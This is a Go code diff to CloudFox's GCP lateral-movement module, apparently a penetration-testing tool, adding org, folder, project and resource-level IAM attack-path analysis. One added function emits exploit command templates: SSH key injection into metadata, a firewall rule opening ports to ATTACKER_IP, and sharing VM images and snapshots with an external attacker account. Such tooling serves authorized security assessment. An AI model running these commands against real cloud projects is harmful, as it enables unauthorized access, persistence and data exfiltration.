@@ -6,6 +6,7 @@ import (
 	"strings"
 	"sync"
 
+	attackpathservice "github.com/BishopFox/cloudfox/gcp/services/attackpathService"
 	CloudRunService "github.com/BishopFox/cloudfox/gcp/services/cloudrunService"
 	ComputeEngineService "github.com/BishopFox/cloudfox/gcp/services/computeEngineService"
 	FunctionsService "github.com/BishopFox/cloudfox/gcp/services/functionsService"
@@ -54,13 +55,25 @@ type ImpersonationChain struct {
 }
 
 type TokenTheftVector struct {
-	ResourceType  string // "instance", "function", "cloudrun", etc.
-	ResourceName  string
-	ProjectID     string
+	ResourceType   string // "instance", "function", "cloudrun", etc.
+	ResourceName   string
+	ProjectID      string
 	ServiceAccount string
-	AttackVector  string // "metadata", "env_var", "startup_script", etc.
-	RiskLevel     string
+	AttackVector   string // "metadata", "env_var", "startup_script", etc.
+	RiskLevel      string
 	ExploitCommand string
+}
+
+// PermissionBasedLateralPath represents a lateral movement capability based on IAM permissions
+type PermissionBasedLateralPath struct {
+	Principal      string // Who has this capability
+	PrincipalType  string // user, serviceAccount, group
+	ProjectID      string // Project where permission exists
+	Permission     string // The dangerous permission
+	Category       string // Category of lateral movement
+	RiskLevel      string // CRITICAL, HIGH, MEDIUM
+	Description    string // What this enables
+	ExploitCommand string // Command to exploit
 }
 
 // ------------------------------
@@ -69,10 +82,11 @@ type TokenTheftVector struct {
 type LateralMovementModule struct {
 	gcpinternal.BaseGCPModule
 
-	ProjectImpersonationChains map[string][]ImpersonationChain           // projectID -> chains
-	ProjectTokenTheftVectors   map[string][]TokenTheftVector             // projectID -> vectors
-	LootMap                    map[string]map[string]*internal.LootFile  // projectID -> loot files
-	mu                         sync.Mutex
+	ProjectImpersonationChains  map[string][]ImpersonationChain            // projectID -> chains
+	ProjectTokenTheftVectors    map[string][]TokenTheftVector              // projectID -> vectors
+	ProjectPermissionBasedPaths map[string][]PermissionBasedLateralPath    // projectID -> permission-based paths
+	LootMap                     map[string]map[string]*internal.LootFile   // projectID -> loot files
+	mu                          sync.Mutex
 }
 
 // ------------------------------
@@ -96,10 +110,11 @@ func runGCPLateralMovementCommand(cmd *cobra.Command, args []string) {
 	}
 
 	module := &LateralMovementModule{
-		BaseGCPModule:              gcpinternal.NewBaseGCPModule(cmdCtx),
-		ProjectImpersonationChains: make(map[string][]ImpersonationChain),
-		ProjectTokenTheftVectors:   make(map[string][]TokenTheftVector),
-		LootMap:                    make(map[string]map[string]*internal.LootFile),
+		BaseGCPModule:               gcpinternal.NewBaseGCPModule(cmdCtx),
+		ProjectImpersonationChains:  make(map[string][]ImpersonationChain),
+		ProjectTokenTheftVectors:    make(map[string][]TokenTheftVector),
+		ProjectPermissionBasedPaths: make(map[string][]PermissionBasedLateralPath),
+		LootMap:                     make(map[string]map[string]*internal.LootFile),
 	}
 
 	module.Execute(cmdCtx.Ctx, cmdCtx.Logger)
@@ -124,26 +139,103 @@ func (m *LateralMovementModule) getAllTokenTheftVectors() []TokenTheftVector {
 	return all
 }
 
+func (m *LateralMovementModule) getAllPermissionBasedPaths() []PermissionBasedLateralPath {
+	var all []PermissionBasedLateralPath
+	for _, paths := range m.ProjectPermissionBasedPaths {
+		all = append(all, paths...)
+	}
+	return all
+}
+
 func (m *LateralMovementModule) Execute(ctx context.Context, logger internal.Logger) {
 	logger.InfoM("Mapping lateral movement paths...", GCP_LATERALMOVEMENT_MODULE_NAME)
+
+	// Analyze org and folder level lateral movement paths (runs once for all projects)
+	m.analyzeOrgFolderLateralPaths(ctx, logger)
 
 	// Process each project
 	m.RunProjectEnumeration(ctx, logger, m.ProjectIDs, GCP_LATERALMOVEMENT_MODULE_NAME, m.processProject)
 
 	allChains := m.getAllImpersonationChains()
 	allVectors := m.getAllTokenTheftVectors()
+	allPermBasedPaths := m.getAllPermissionBasedPaths()
 
 	// Check results
-	totalPaths := len(allChains) + len(allVectors)
+	totalPaths := len(allChains) + len(allVectors) + len(allPermBasedPaths)
 	if totalPaths == 0 {
 		logger.InfoM("No lateral movement paths found", GCP_LATERALMOVEMENT_MODULE_NAME)
 		return
 	}
 
-	logger.SuccessM(fmt.Sprintf("Found %d lateral movement path(s): %d impersonation chains, %d token theft vectors",
-		totalPaths, len(allChains), len(allVectors)), GCP_LATERALMOVEMENT_MODULE_NAME)
+	logger.SuccessM(fmt.Sprintf("Found %d lateral movement path(s): %d impersonation chains, %d token theft vectors, %d permission-based",
+		totalPaths, len(allChains), len(allVectors), len(allPermBasedPaths)), GCP_LATERALMOVEMENT_MODULE_NAME)
 
 	m.writeOutput(ctx, logger)
+}
+
+// analyzeOrgFolderLateralPaths analyzes organization and folder level IAM for lateral movement permissions
+func (m *LateralMovementModule) analyzeOrgFolderLateralPaths(ctx context.Context, logger internal.Logger) {
+	attackSvc := attackpathservice.New()
+
+	// Analyze organization-level IAM
+	orgPaths, orgNames, _, err := attackSvc.AnalyzeOrganizationAttackPaths(ctx, "lateral")
+	if err != nil {
+		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
+			gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME, "Could not analyze organization-level lateral movement paths")
+		}
+	} else if len(orgPaths) > 0 {
+		logger.InfoM(fmt.Sprintf("Found %d organization-level lateral movement path(s)", len(orgPaths)), GCP_LATERALMOVEMENT_MODULE_NAME)
+		for _, path := range orgPaths {
+			orgName := orgNames[path.ScopeID]
+			if orgName == "" {
+				orgName = path.ScopeID
+			}
+			lateralPath := PermissionBasedLateralPath{
+				Principal:      path.Principal,
+				PrincipalType:  path.PrincipalType,
+				ProjectID:      "org:" + path.ScopeID,
+				Permission:     path.Method,
+				Category:       path.Category + " (Org: " + orgName + ")",
+				RiskLevel:      "CRITICAL", // Org-level is critical
+				Description:    path.Description,
+				ExploitCommand: path.ExploitCommand,
+			}
+			// Store under a special "organization" key
+			m.mu.Lock()
+			m.ProjectPermissionBasedPaths["organization"] = append(m.ProjectPermissionBasedPaths["organization"], lateralPath)
+			m.mu.Unlock()
+		}
+	}
+
+	// Analyze folder-level IAM
+	folderPaths, folderNames, err := attackSvc.AnalyzeFolderAttackPaths(ctx, "lateral")
+	if err != nil {
+		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
+			gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME, "Could not analyze folder-level lateral movement paths")
+		}
+	} else if len(folderPaths) > 0 {
+		logger.InfoM(fmt.Sprintf("Found %d folder-level lateral movement path(s)", len(folderPaths)), GCP_LATERALMOVEMENT_MODULE_NAME)
+		for _, path := range folderPaths {
+			folderName := folderNames[path.ScopeID]
+			if folderName == "" {
+				folderName = path.ScopeID
+			}
+			lateralPath := PermissionBasedLateralPath{
+				Principal:      path.Principal,
+				PrincipalType:  path.PrincipalType,
+				ProjectID:      "folder:" + path.ScopeID,
+				Permission:     path.Method,
+				Category:       path.Category + " (Folder: " + folderName + ")",
+				RiskLevel:      "CRITICAL", // Folder-level is critical
+				Description:    path.Description,
+				ExploitCommand: path.ExploitCommand,
+			}
+			// Store under a special "folder" key
+			m.mu.Lock()
+			m.ProjectPermissionBasedPaths["folder"] = append(m.ProjectPermissionBasedPaths["folder"], lateralPath)
+			m.mu.Unlock()
+		}
+	}
 }
 
 // ------------------------------
@@ -177,6 +269,9 @@ func (m *LateralMovementModule) processProject(ctx context.Context, projectID st
 
 	// 2. Find token theft vectors (compute instances, functions, etc.)
 	m.findTokenTheftVectors(ctx, projectID, logger)
+
+	// 3. Find permission-based lateral movement paths
+	m.findPermissionBasedLateralPaths(ctx, projectID, logger)
 }
 
 // findImpersonationChains finds service account impersonation paths
@@ -599,6 +694,131 @@ gcloud container clusters get-credentials %s --location=%s --project=%s
 		m.addTokenTheftVectorToLoot(projectID, vector)
 		m.mu.Unlock()
 	}
+}
+
+// findPermissionBasedLateralPaths identifies principals with lateral movement permissions
+// This now uses the centralized attackpathService for project and resource-level analysis
+func (m *LateralMovementModule) findPermissionBasedLateralPaths(ctx context.Context, projectID string, logger internal.Logger) {
+	// Use attackpathService for project-level analysis
+	attackSvc := attackpathservice.New()
+
+	projectName := m.GetProjectName(projectID)
+	paths, err := attackSvc.AnalyzeProjectAttackPaths(ctx, projectID, projectName, "lateral")
+	if err != nil {
+		gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME,
+			fmt.Sprintf("Could not analyze lateral movement permissions for project %s", projectID))
+		return
+	}
+
+	// Convert AttackPath to PermissionBasedLateralPath
+	for _, path := range paths {
+		lateralPath := PermissionBasedLateralPath{
+			Principal:      path.Principal,
+			PrincipalType:  path.PrincipalType,
+			ProjectID:      projectID,
+			Permission:     path.Method,
+			Category:       path.Category,
+			RiskLevel:      "HIGH", // Default risk level
+			Description:    path.Description,
+			ExploitCommand: path.ExploitCommand,
+		}
+
+		m.mu.Lock()
+		m.ProjectPermissionBasedPaths[projectID] = append(m.ProjectPermissionBasedPaths[projectID], lateralPath)
+		m.mu.Unlock()
+	}
+
+	// Also analyze resource-level IAM
+	resourcePaths, err := attackSvc.AnalyzeResourceAttackPaths(ctx, projectID, "lateral")
+	if err != nil {
+		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
+			gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME,
+				fmt.Sprintf("Could not analyze resource-level lateral movement permissions for project %s", projectID))
+		}
+	} else {
+		for _, path := range resourcePaths {
+			lateralPath := PermissionBasedLateralPath{
+				Principal:      path.Principal,
+				PrincipalType:  path.PrincipalType,
+				ProjectID:      projectID,
+				Permission:     path.Method,
+				Category:       path.Category + " (Resource: " + path.ScopeName + ")",
+				RiskLevel:      "HIGH",
+				Description:    path.Description,
+				ExploitCommand: path.ExploitCommand,
+			}
+
+			m.mu.Lock()
+			m.ProjectPermissionBasedPaths[projectID] = append(m.ProjectPermissionBasedPaths[projectID], lateralPath)
+			m.mu.Unlock()
+		}
+	}
+}
+
+// generateLateralExploitCommand generates an exploit command for a lateral movement permission
+func (m *LateralMovementModule) generateLateralExploitCommand(permission, projectID string) string {
+	switch permission {
+	case "compute.networks.addPeering":
+		return fmt.Sprintf(`# Create VPC peering to another project's network
+gcloud compute networks peerings create lateral-peering \
+    --network=NETWORK_NAME \
+    --peer-network=projects/TARGET_PROJECT/global/networks/TARGET_NETWORK \
+    --project=%s`, projectID)
+	case "compute.instances.osLogin":
+		return fmt.Sprintf(`# SSH into instance via OS Login
+gcloud compute ssh INSTANCE_NAME --zone=ZONE --project=%s`, projectID)
+	case "compute.instances.osAdminLogin":
+		return fmt.Sprintf(`# SSH into instance with sudo via OS Login
+gcloud compute ssh INSTANCE_NAME --zone=ZONE --project=%s
+# Then: sudo su`, projectID)
+	case "compute.instances.setMetadata":
+		return fmt.Sprintf(`# Add SSH key to instance metadata
+gcloud compute instances add-metadata INSTANCE_NAME --zone=ZONE \
+    --metadata=ssh-keys="username:$(cat ~/.ssh/id_rsa.pub)" --project=%s`, projectID)
+	case "compute.projects.setCommonInstanceMetadata":
+		return fmt.Sprintf(`# Add SSH key to project-wide metadata (affects all instances)
+gcloud compute project-info add-metadata \
+    --metadata=ssh-keys="username:$(cat ~/.ssh/id_rsa.pub)" --project=%s`, projectID)
+	case "container.clusters.getCredentials":
+		return fmt.Sprintf(`# Get GKE cluster credentials
+gcloud container clusters get-credentials CLUSTER_NAME --zone=ZONE --project=%s`, projectID)
+	case "container.pods.exec":
+		return fmt.Sprintf(`# Execute commands in a pod
+kubectl exec -it POD_NAME -- /bin/sh`, projectID)
+	case "compute.firewalls.create":
+		return fmt.Sprintf(`# Create firewall rule to allow access
+gcloud compute firewall-rules create allow-lateral \
+    --network=NETWORK_NAME --allow=tcp:22,tcp:3389 \
+    --source-ranges=ATTACKER_IP/32 --project=%s`, projectID)
+	case "cloudsql.instances.connect":
+		return fmt.Sprintf(`# Connect to Cloud SQL instance
+gcloud sql connect INSTANCE_NAME --user=USER --project=%s`, projectID)
+	case "iap.tunnelInstances.accessViaIAP":
+		return fmt.Sprintf(`# Access instance via IAP tunnel
+gcloud compute start-iap-tunnel INSTANCE_NAME PORT --zone=ZONE --project=%s`, projectID)
+	case "compute.images.setIamPolicy":
+		return fmt.Sprintf(`# Share VM image with external project
+gcloud compute images add-iam-policy-binding IMAGE_NAME \
+    --member='user:attacker@external.com' --role='roles/compute.imageUser' --project=%s`, projectID)
+	case "compute.snapshots.setIamPolicy":
+		return fmt.Sprintf(`# Share snapshot with external project
+gcloud compute snapshots add-iam-policy-binding SNAPSHOT_NAME \
+    --member='user:attacker@external.com' --role='roles/compute.storageAdmin' --project=%s`, projectID)
+	default:
+		return fmt.Sprintf("# Permission: %s\n# Refer to GCP documentation for exploitation", permission)
+	}
+}
+
+// extractLateralPrincipalType extracts the type from a principal name
+func extractLateralPrincipalType(principalName string) string {
+	if strings.HasPrefix(principalName, "user:") {
+		return "user"
+	} else if strings.HasPrefix(principalName, "serviceAccount:") {
+		return "serviceAccount"
+	} else if strings.HasPrefix(principalName, "group:") {
+		return "group"
+	}
+	return "unknown"
 }
 
 // ------------------------------
